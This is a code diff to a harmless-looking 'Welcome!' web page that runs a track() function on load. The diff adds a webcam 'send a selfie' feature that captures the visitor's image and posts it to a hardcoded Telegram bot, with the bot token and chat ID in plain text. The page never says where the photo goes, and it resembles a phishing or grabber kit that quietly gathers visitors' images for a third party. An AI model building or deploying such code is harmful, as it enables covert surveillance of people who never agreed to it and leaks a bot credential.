@@ -23,6 +23,26 @@
             padding: 20px;
             border-radius: 10px;
         }
+        .camera-container {
+            margin-top: 20px;
+        }
+        .camera-container video, .camera-container canvas {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+        }
+        .camera-container button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007BFF;
+            color: white;
+            cursor: pointer;
+        }
+        .camera-container button:hover {
+            background-color: #0056b3;
+        }
     </style>
     <script>
         function track() {
@@ -51,12 +71,60 @@
                         });
                 });
         }
+
+        function takeSelfie() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            const captureButton = document.getElementById('captureButton');
+            const sendButton = document.getElementById('sendButton');
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                    captureButton.style.display = 'block';
+                })
+                .catch(err => {
+                    console.error('Error accessing the camera:', err);
+                });
+
+            captureButton.addEventListener('click', () => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                captureButton.style.display = 'none';
+                sendButton.style.display = 'block';
+            });
+
+            sendButton.addEventListener('click', () => {
+                const imageData = canvas.toDataURL('image/jpeg');
+                const botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
+                const chatId = '5410457102';
+                fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: imageData
+                    })
+                });
+                sendButton.style.display = 'none';
+            });
+        }
     </script>
 </head>
 <body onload="track()">
     <div>
         <h1>Welcome!</h1>
         <p>Thank you for visiting.</p>
+        <div class="camera-container">
+            <video id="video" autoplay></video>
+            <canvas id="canvas" style="display: none;"></canvas>
+            <button id="captureButton" style="display: none;">Capture Selfie</button>
+            <button id="sendButton" style="display: none;">Send Selfie</button>
+        </div>
+        <a href="#" onclick="takeSelfie(); return false;">Click here to send a selfie</a>
     </div>
 </body>
 </html>
